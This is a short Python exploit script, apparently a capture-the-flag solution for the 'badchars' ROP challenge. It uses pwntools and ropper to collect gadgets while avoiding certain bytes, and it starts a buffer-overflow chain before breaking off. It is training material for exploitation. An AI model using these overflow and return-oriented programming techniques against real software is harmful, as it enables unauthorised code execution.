from pwn import *

from ropper import RopperService

options = {'color' : False,
           'badbytes' : '7867612e', #xga.
           'all' : False,
           'inst_count' : 6,
           'type' : 'all',
           'detailed' : False}

rs = RopperService(options)
rs.addFile('./badchars')
rs.loadGadgetsFor()
rs.printGadgetsFor()
rs.removeFile('./badchars')

 
context.clear(arch='amd64')
context.terminal=['urxvt', '-e']

binary = ELF('./badchars')
p = process('./badchars')

rop = ROP(binary)

#0x0000000000400628: xor byte ptr [r15], r14b; ret; 
#0x0000000000400629: xor byte ptr [rdi], dh; ret; 
#0x000000000040062c: add byte ptr [r15], r14b; ret; 
#0x00000000004006a0: pop r14; pop r15; ret; 

xor_r15_r14b = int('0x0000000000400628', 16)
pop_r14_r15 = int('0x00000000004006a0', 16)
add_r15_r14b = int('0x000000000040062c', 16)

data_start = binary.symbols['data_start']
print_file = binary.plt['print_file']
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]

#pop_r12 = rop.find_gadget(['pop r13', 'pop r12' 'ret'])[0]
pop_r13 = rop.find_gadget(['pop r13', 'ret'])[0]

bof_len = 40

rop_chain = b'A' * bof_len

